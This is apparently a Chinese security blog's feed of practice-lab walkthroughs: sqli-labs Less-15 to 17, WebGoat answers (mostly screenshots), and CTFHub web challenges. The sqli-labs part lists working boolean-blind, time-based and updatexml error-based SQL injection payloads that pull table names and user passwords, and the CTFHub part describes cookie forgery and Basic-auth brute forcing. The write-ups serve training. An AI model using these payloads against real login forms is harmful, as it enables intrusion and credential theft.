<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a><strong>Less-15</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; or 1=1#&amp;passwd=111&amp;submit=submit   successfully</span><br><span class="line">uname=1&#x27; or 1=2#&amp;passwd=111&amp;submit=submit    failed 说明是单引号闭合。</span><br><span class="line"></span><br><span class="line">猜数据库长度</span><br><span class="line">uname=1&#x27; or length(database())&gt;7#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜数据库名字</span><br><span class="line">uname=1&#x27; or ascii(substr(database(),1,1))&gt;114#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜数据库名字</span><br><span class="line">uname=1&#x27; or ascii(substr(database(),1,1))&gt;114#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜表名长度</span><br><span class="line">uname=1&#x27; or length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜表名名字</span><br><span class="line">uname=1&#x27; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜列名长度</span><br><span class="line">uname=1&#x27; or (length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1)))&gt;1#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜列名名字</span><br><span class="line">uname=1&#x27; or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜数据长度</span><br><span class="line">uname=1&#x27; or length((select password from users limit 0,1))&gt;3#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜数据名字</span><br><span class="line">uname=1&#x27; or ascii(substr((select password from users limit 0,1),1,1))&gt;67#&amp;submit=submit</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-15.py">【实操脚本地址 Less-15.py】</a></p>
<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a><strong>Less-16</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">时间盲注</span><br><span class="line">uname=admin&#x27; and sleep(5)#&amp;passwd=admin&amp;submit=Submit #快速反应</span><br><span class="line">uname=admin&quot; and sleep(5)#&amp;passwd=admin&amp;submit=Submit #快速反应</span><br><span class="line">uname=admin&quot;) and sleep(5)#&amp;passwd=admin&amp;submit=Submit #页面休眠5秒</span><br><span class="line">判断这里闭合方式为&quot;)，并且为字符型注入</span><br><span class="line"></span><br><span class="line">查看当前数据库长度</span><br><span class="line">uname=admin&quot;) and if(length(database())=8,sleep(5),1)#&amp;passwd=1&amp;submit=Submit</span><br><span class="line">查库名</span><br><span class="line">uname=admin&quot;) and if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)#&amp;passwd=1&amp;submit=Submit</span><br><span class="line">查表名</span><br><span class="line">uname=admin&quot;) and if((select count(table_name) from information_schema.tables where table_schema=database())=4,sleep(5),1) #&amp;passwd=1&amp;submit=Submit</span><br><span class="line">查列名</span><br><span class="line">uname=admin&quot;) and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;emails&#x27;)=2,sleep(5),1) #&amp;passwd=1&amp;submit=Submit </span><br><span class="line">查数据</span><br><span class="line">uname=admin&quot;) and if((select ascii(substring(column_name, 1, 1)) from information_schema.columns where table_name = &#x27;emails&#x27; limit 0,1)判断表达式, sleep(5), 1) #&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-16.py">【实操脚本地址 Less-16.py】</a></p>
<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><strong>Less-17</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># updatexml() 报错注入</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,version()),2)#&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">获取数据库信息</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,database()),2)#&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;security&#x27;)),2)#&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = &#x27;security&#x27; AND table_name = &#x27;users&#x27;)),2)#&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#submit=submit</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 1,1)),1))#submit=submit</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>本地靶场</category>
      </categories>
      <tags>
        <tag>靶场通关秘籍</tag>
      </tags>
  </entry>
  <entry>
    <title>本地靶场 - webgoat通关秘籍</title>
    <url>/cnblogs.github.io/2025/01/05/hacker/local/range/webgoat/webgoat%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/</url>
    <content><![CDATA[<h3 id="General"><a href="#General" class="headerlink" title="General"></a><strong>General</strong></h3><h4 id="HTTP-Basics"><a href="#HTTP-Basics" class="headerlink" title="HTTP Basics"></a><strong>HTTP Basics</strong></h4><h5 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/05/qZrLHy9OVpRX1KU.png"><br><img src="https://s2.loli.net/2025/01/05/cRjEqoKMUODPfFL.png"><br><img src="https://s2.loli.net/2025/01/05/yXhSjrdTcNxf5F6.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：fzheng</span><br></pre></td></tr></table></figure>
<h5 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/05/agcojkKuLtqnIZR.png"><br><img src="https://s2.loli.net/2025/01/05/pq7uzC5VAOglkev.png"><br><img src="https://s2.loli.net/2025/01/05/XNZqAYvudfIGs1e.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用burpsuit抓包 修改magicnum参数=27</span><br></pre></td></tr></table></figure>
<h4 id="HTTP-Proxies"><a href="#HTTP-Proxies" class="headerlink" title="HTTP Proxies"></a><strong>HTTP Proxies</strong></h4><h5 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/ZanYXFobJ1q8dmk.png"><br><img src="https://s2.loli.net/2025/01/12/3PChtO4KURcXrFJ.png"><br><img src="https://s2.loli.net/2025/01/12/C1orGDkVf8K72BW.png"><br><img src="https://s2.loli.net/2025/01/12/VD48qH1zSXrWOeY.png"><br><img src="https://s2.loli.net/2025/01/12/7D4r2pzCcOBQwXH.png"></p>
<h4 id="Developer-Tools"><a href="#Developer-Tools" class="headerlink" title="Developer Tools"></a><strong>Developer Tools</strong></h4><h5 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a><strong>第四题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/oSYcxnuZ38ydWbG.png"></p>
<h5 id="第六题-1"><a href="#第六题-1" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/h6AcPSmOwkG3IpT.png"></p>
<h4 id="Crypto-Basics"><a href="#Crypto-Basics" class="headerlink" title="Crypto Basics"></a><strong>Crypto Basics</strong></h4><h5 id="第二题-1"><a href="#第二题-1" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/IlPrYy8ihAgHQ6m.png"><br><img src="https://s2.loli.net/2025/01/12/p5tMTbOLwilacIZ.png"><br><img src="https://s2.loli.net/2025/01/12/lXPgZ3Qhp1D5Ouo.png"></p>
<h5 id="第三题-1"><a href="#第三题-1" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/1w7fQ9lINFHcUxo.png"><br><img src="https://s2.loli.net/2025/01/12/bAngzxHpoLVmSXW.png"><br><img src="https://s2.loli.net/2025/01/12/cKn9d5eBfY31TPz.png"></p>
<h5 id="第四题-1"><a href="#第四题-1" class="headerlink" title="第四题"></a><strong>第四题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/WApaYRUiDkTm7Zn.png"><br><img src="https://s2.loli.net/2025/01/12/J2t8vgAmeBG9Z4n.png"><br><img src="https://s2.loli.net/2025/01/12/fGiTBd3Jxb827rY.png"><br><img src="https://s2.loli.net/2025/01/12/UC8FMio4J2QPHq5.png"></p>
<h5 id="第六题-2"><a href="#第六题-2" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/zUSBqDhQAIdVHfs.png"><br><img src="https://s2.loli.net/2025/01/12/BL9QPzJoZSe3hTs.png"><br><img src="https://s2.loli.net/2025/01/12/M9sBCrHVUZ6oYjm.png"><br><img src="https://s2.loli.net/2025/01/12/8nPNOAJYX3qdLlZ.png"><br><img src="https://s2.loli.net/2025/01/12/IUrRtNqzxSwZH2M.png"><br><img src="https://s2.loli.net/2025/01/12/EgcNj24WCIoDVz5.png"></p>
<h5 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a><strong>第八题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/cIZHb89V2m6LRuF.png"><br><img src="https://s2.loli.net/2025/01/12/tTUZaHSWpo1yMCB.png"><br><img src="https://s2.loli.net/2025/01/12/IjJsMkSZfuntxbQ.png"><br><img src="https://s2.loli.net/2025/01/12/sXU8WKyPAvHBeF7.png"></p>
<h4 id="Writing-new-lesson"><a href="#Writing-new-lesson" class="headerlink" title="Writing new lesson"></a><strong>Writing new lesson</strong></h4><h5 id="第六题-3"><a href="#第六题-3" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/kpbc2v4eJqF6gNW.png"><br><img src="https://s2.loli.net/2025/01/12/8W4Rh7p6zxtKZcr.png"></p>
<h3 id="A1-Injection"><a href="#A1-Injection" class="headerlink" title="(A1) Injection"></a><strong>(A1) Injection</strong></h3><h4 id="SQL-Injection-intro"><a href="#SQL-Injection-intro" class="headerlink" title="SQL Injection (intro)"></a><strong>SQL Injection (intro)</strong></h4><h5 id="第二题-2"><a href="#第二题-2" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/hvGKs76z9Bl2RHj.png"></p>
<h5 id="第三题-2"><a href="#第三题-2" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/T2byeqKsmEwZC7X.png"></p>
<h5 id="第四题-2"><a href="#第四题-2" class="headerlink" title="第四题"></a><strong>第四题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/tpxzVDZejcvuKoC.png"></p>
<h5 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a><strong>第五题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/YOBfaq23v8npyVu.png"></p>
<h5 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a><strong>第九题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/GHsamEAYQXthn3w.png"></p>
<h5 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a><strong>第十题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/shDvAq4ZBgpR67d.png"></p>
<h5 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a><strong>第十一题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/aE9cpQUmBxwrT6C.png"></p>
<h5 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a><strong>第十二题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/8rvmANgYiMP3Tco.png"></p>
<h5 id="第十三题"><a href="#第十三题" class="headerlink" title="第十三题"></a><strong>第十三题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/p3P7KkDGQq4zgdj.png"></p>
<h4 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection (advanced)"></a><strong>SQL Injection (advanced)</strong></h4><h5 id="第三题-3"><a href="#第三题-3" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/XEmkbDn5SVlKQRr.png"></p>
<h5 id="第五题-1"><a href="#第五题-1" class="headerlink" title="第五题"></a><strong>第五题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/759Pxfdgqlb8yGF.png"><br><a href="https://github.com/Cancerking/hacker-tools/blob/main/python/local/range/wetgoat/(A1)%20Injection%20-%20SQL%20Injection%20(advanced)_5.py">脚本地址</a></p>
<h4 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection (mitigation)"></a><strong>SQL Injection (mitigation)</strong></h4><h5 id="第五题-2"><a href="#第五题-2" class="headerlink" title="第五题"></a><strong>第五题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/tnrCx2mpXQ3Kib1.png"></p>
<h5 id="第六题-4"><a href="#第六题-4" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/tNmBcuO74ov5y8k.png"></p>
<h5 id="第九题-1"><a href="#第九题-1" class="headerlink" title="第九题"></a><strong>第九题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/OdgHmDPqpJvMClW.png"></p>
<h5 id="第十题-1"><a href="#第十题-1" class="headerlink" title="第十题"></a><strong>第十题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/zmY9Tqe713wOiDk.png"></p>
<h5 id="第十二题-1"><a href="#第十二题-1" class="headerlink" title="第十二题"></a><strong>第十二题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/oVn9Fe6BRy3msOu.png"><br><img src="https://s2.loli.net/2025/01/14/SZexDlGJkcmE4VA.png"><br><img src="https://s2.loli.net/2025/01/14/UF7IPBSEujKGAbn.png"><br><img src="https://s2.loli.net/2025/01/14/6LqBuZjJT5YHdgt.png"></p>
<h4 id="Path-traversal"><a href="#Path-traversal" class="headerlink" title="Path traversal"></a><strong>Path traversal</strong></h4><h5 id="第二题-3"><a href="#第二题-3" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/h5Z3CDNfsFlW8Tm.png"></p>
<h5 id="第三题-4"><a href="#第三题-4" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/xsMgRocq23vSYOd.png"></p>
<h5 id="第四题-3"><a href="#第四题-3" class="headerlink" title="第四题"></a><strong>第四题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/icVbesTF8SDQvBH.png"><br><img src="https://s2.loli.net/2025/01/14/brZScJBvuqIlXNV.png"></p>
<h5 id="第五题-3"><a href="#第五题-3" class="headerlink" title="第五题"></a><strong>第五题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/MqYBXUK8bQ7LFoh.png"><br><img src="https://s2.loli.net/2025/01/14/av4YxRUnmIXZiFb.png"></p>
<h5 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a><strong>第七题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/bGNw6q2LXQIm1JC.png"></p>
<h3 id="A2-Broken-Authentication"><a href="#A2-Broken-Authentication" class="headerlink" title="(A2) Broken Authentication"></a><strong>(A2) Broken Authentication</strong></h3><h4 id="Authentication-Bypasses"><a href="#Authentication-Bypasses" class="headerlink" title="Authentication Bypasses"></a><strong>Authentication Bypasses</strong></h4><h5 id="第二题-4"><a href="#第二题-4" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/lBGfgJq9EeXyiAI.png"><br><img src="https://s2.loli.net/2025/01/14/iceXM5Qlx2VqyHt.png"></p>
<h4 id="JWT-tokens"><a href="#JWT-tokens" class="headerlink" title="JWT tokens"></a><strong>JWT tokens</strong></h4><h5 id="第三题-5"><a href="#第三题-5" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/JFjClN72tuYQeAb.png"><br><img src="https://s2.loli.net/2025/01/14/y67Nw5ulqkpfYAZ.png"></p>
]]></content>
      <categories>
        <category>本地靶场</category>
      </categories>
      <tags>
        <tag>靶场通关秘籍</tag>
      </tags>
  </entry>
  <entry>
    <title>网络靶场 - CTFHub</title>
    <url>/cnblogs.github.io/2025/01/05/hacker/online/range/CTFHub/CTFHub/</url>
    <content><![CDATA[<h2 id="技能树"><a href="#技能树" class="headerlink" title="技能树"></a><strong>技能树</strong></h2><h3 id="WEB前置技能"><a href="#WEB前置技能" class="headerlink" title="WEB前置技能"></a><strong>WEB前置技能</strong></h3><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a><strong>HTTP协议</strong></h4><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a><strong>请求方式</strong></h5><p><img src="https://s2.loli.net/2025/01/05/Y8liGIxr27pvLJU.png"><br><img src="https://s2.loli.net/2025/01/05/WvBCPqD8R3r5j74.png"><br>得到提示，如果请求方法为CTFHUB，那么会得到flag<br>使用burp抓包进行修改GET为CTFHUB,得到flag<br><img src="https://s2.loli.net/2025/01/05/Tdtj9kuelKUaCRp.png"></p>
<h5 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a><strong>302跳转</strong></h5><p><img src="https://s2.loli.net/2025/01/06/ceMrzoPnvVkODiI.png"><br><img src="https://s2.loli.net/2025/01/06/SXAm3CLFU7qfhJd.png"><br> 点击Give me Flag后发生跳转<br><img src="https://s2.loli.net/2025/01/06/dVWft2hr5EYlPZg.png"><br> F12-&gt;Network<br><img src="https://s2.loli.net/2025/01/06/NXheyLSiCrKOVYE.png"><br> 点击进去之后可以看到有一个链接，下意识点击抓包<br><img src="https://s2.loli.net/2025/01/06/aF5yeSgrY7f1cim.png"><br> 成功拿到flag</p>
<h5 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a><strong>Cookie</strong></h5><p><img src="https://s2.loli.net/2025/01/06/RJmU937GoqrpYQl.png"><br><img src="https://s2.loli.net/2025/01/06/slHREaF2BPzA4Zg.png"><br>这是道cookie题，又说要admin才能得到flag，应该是要伪造cookie，抓包<br><img src="https://s2.loli.net/2025/01/06/ZGWak5ocOVspX3r.png"><br>一开始我以为admin后面要写用户名或者密码啥的，然后就爆破，一直爆不出来 ，然后把0改成1，就可以出来flag<br><img src="https://s2.loli.net/2025/01/06/Yev8IGXhZSOrByz.png"><br>我在网上查时，cookie的一行应该为一条数据。也就是说这条数据的 “名字” 叫做admin，其 值 为0，改成就可以出来，但我用2，又不行了。</p>
<h5 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a><strong>基础认证</strong></h5><p><img src="https://s2.loli.net/2025/01/16/aW5OZzuvrKhn9mx.png"><br><img src="https://s2.loli.net/2025/01/16/fYT8pqvmja2BAsx.png"><br>题目附件下载下来是个字典<br><img src="https://s2.loli.net/2025/01/16/txqzJFX6CiTQjIr.png"><br>点击Click，需要输入用户名和密码<br><img src="https://s2.loli.net/2025/01/16/hcjZBGQ7k5NVOmi.png"><br>尝试输入admin，admin，没有反应。使用burp suite抓包 。在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。在进行基本认证的过程里，请求的HTTP头字段会包含Authorization字段，形式如下： Authorization: Basic &lt;凭证&gt;，该凭证是用户和密码的组和的base64编码。<br><img src="https://s2.loli.net/2025/01/16/VRnjciu4FevpdBw.png"><br>抓包得到的凭证为YWRtaW46YWRtaW4&#x3D;（base64编码）将凭证解码后，显示的就是刚刚输入的用户名和密码<br><img src="https://s2.loli.net/2025/01/16/E8hQRMakPw9FuiK.png"><br>猜测可能需要使用附件提供的字典进行爆破。右键，send to intruder<br><img src="https://s2.loli.net/2025/01/16/dqo8ym5fce1HOQ4.png"><br>点击Add，将 Basic 后面 base64 部分添加为 payload position<br><img src="https://s2.loli.net/2025/01/16/ib7eYslhHq8Z5MR.png"><br>加载附件中的字典<br><img src="https://s2.loli.net/2025/01/16/W8Sxzvl7GnHAjPq.png"><br>添加admin：（将用户名定义成admin并添加分隔符）<br><img src="https://s2.loli.net/2025/01/16/VLwH84RY5EWJupr.png"><br>添加base64编码<br><img src="https://s2.loli.net/2025/01/16/Nbp27HeSwsBCufr.png"><br>取消url编码的勾选，不然&#x3D;会被转换成%3d<br><img src="https://s2.loli.net/2025/01/16/qCfL2tRHIk7X35v.png"><br>开始爆破<br><img src="https://s2.loli.net/2025/01/16/saGEoRUhtKXSJbN.png"><br>爆破完成之后，点击Length,发现一个长度不一样的，点击查看response，拿到flag<br><img src="https://s2.loli.net/2025/01/16/nLWD9I6OPTdboU8.png"></p>
<h5 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a><strong>响应包源代码</strong></h5><p><img src="https://s2.loli.net/2025/01/16/37v5jAigLpaMlTO.png"><br>靶机环境：打开是个贪吃蛇的游戏<br><img src="https://s2.loli.net/2025/01/16/3IzY4VmLHbP95Oh.png"><br>根据提示，右键，检查源码，发现flag就在源码中<br><img src="https://s2.loli.net/2025/01/16/CyoP2vsxKmWlqRe.png"></p>
<h4 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a><strong>信息泄露</strong></h4><h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a><strong>目录遍历</strong></h5><p><img src="https://s2.loli.net/2025/01/16/EmOx3GSZ295fH1U.png"><br>目录遍历，实际上就是让新手熟悉信息资源目录，手动找就能找到。真·有手就行。快速拿到flag 开启环境后看到有按钮，直接点进去进入目录。<br><img src="https://s2.loli.net/2025/01/16/JxnXR8SuMk4jvlT.png"><br><img src="https://s2.loli.net/2025/01/16/HUKGm9asNVELRc8.png"><br>简单的遍历目录一个个找下去就能找到，每次开启不同的环境，flag也会不同。【避免投机取巧】<br><img src="https://s2.loli.net/2025/01/16/aGYVdXCwe67UMxW.png"><br>扩展_使用代码 如果文件太多手动无法找到怎么办，此时就需要写代码拿到flag了。仔细观察url，每点入一个目录，就会有&#x2F;1&#x2F; 、&#x2F;2&#x2F; 一共四个目录，有规律，可以通过字符串拼接的方式拿到。此处使用requests库（requests是使用Apache2 licensed 许可证的HTTP库）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># _*_ coding:utf-8 _*_</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://challenge-86f520eadd52975a.sandbox.ctfhub.com:10800/flag_in_here/&quot;</span><br><span class="line"></span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        # URL字符串拼接</span><br><span class="line">        url_test =url+&quot;/&quot;+str(i)+&quot;/&quot;+str(j)</span><br><span class="line">        # 获取页面响应内容</span><br><span class="line">        r = requests.get(url_test)</span><br><span class="line">        # 设置编码方式</span><br><span class="line">        r.encoding = &#x27;utf-8&#x27;</span><br><span class="line">        # 查找是否存在 flag.txt</span><br><span class="line">        get_file=r.text</span><br><span class="line">        if &quot;flag.txt&quot; in get_file:</span><br><span class="line">            print(url_test)</span><br><span class="line"></span><br><span class="line"># 此程序只适用于flag.txt文件形式存在的flag</span><br></pre></td></tr></table></figure>
<p>运行python代码，即可得到flag.txt存储路径的url。<br><img src="https://s2.loli.net/2025/01/16/JvTshlDALzmKaBw.png"><br><img src="https://s2.loli.net/2025/01/16/Fa7zTItL1KNUDOC.png"></p>
]]></content>
      <categories>
        <category>网络靶场</category>
      </categories>
      <tags>
        <tag>靶场通关秘籍</tag>
      </tags>
  </entry>
</search>
